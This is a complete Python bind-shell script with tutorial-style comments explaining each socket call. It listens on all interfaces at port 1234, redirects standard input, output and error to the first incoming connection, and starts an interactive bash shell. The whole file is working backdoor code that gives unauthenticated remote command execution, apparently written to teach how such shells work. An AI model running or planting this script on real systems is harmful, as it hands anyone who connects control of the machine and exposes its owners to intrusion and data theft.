#!/usr/bin/env python3

import socket, os, subprocess

s = socket.socket()                                      # create TCP socket; socket.socket() defaults to AF_INET, SOCK_STREAM -  AF_INET stands for IPv4, SOCK_STREAM for TCP; "s" becomes our listening socket.
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Prevent "Address already in use": SOL_SOCKET is the socket layer itself; 1 = enable this option. 


s.bind(("0.0.0.0", 1234))                                # bind the socket to an IP address and a port number; associates the socket with a local IP address and port so the OS knows where to deliver incoming packets for that socket.
s.listen(1)                                              # listen for incoming connections; marks the socket as a passive listener; the argument is backlog (how many unaccepted connections the OS may queue).
shell_socket, addr = s.accept()                          # accept incoming connection; blocks until an incoming connection is established, then returns a new socket object used for that connection and the remote address tuple.

# Redirect stdio to socket
for fd in (0, 1, 2): 
    os.dup2(shell_socket.fileno(), fd)                   # os.dup2(oldfd, newfd) duplicates old file descriptors (0 = stdin, 1 = stdout, 2 = stderr) onto newfd.
                                                         # The fileno() method in Python returns the integer file descriptor associated with an open file object. 


subprocess.call(["/bin/bash", "-i"])                    # execute shell